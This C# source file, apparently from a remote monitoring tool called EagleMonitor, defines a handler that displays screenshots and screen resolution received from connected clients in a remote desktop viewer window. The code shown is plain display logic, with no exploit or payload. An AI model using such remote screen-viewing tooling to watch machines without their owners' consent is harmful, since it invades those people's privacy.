using EagleMonitor.Networking;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class RemoteViewerPacketHandler
    {
        public RemoteViewerPacketHandler(RemoteViewerPacket remoteViewerPacket, ClientHandler clientHandler) : base() 
        {
            try
            {
                ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.BeginInvoke((MethodInvoker)(() =>
                {
                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.hasAlreadyConnected = true;
                    if (ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture) != null)
                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.viewerPictureBox.Image = ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture);
                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.hResol = remoteViewerPacket.hResol;
                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.vResol = remoteViewerPacket.vResol;
                }));
                return;
            }
            catch { }
        }
    }
}
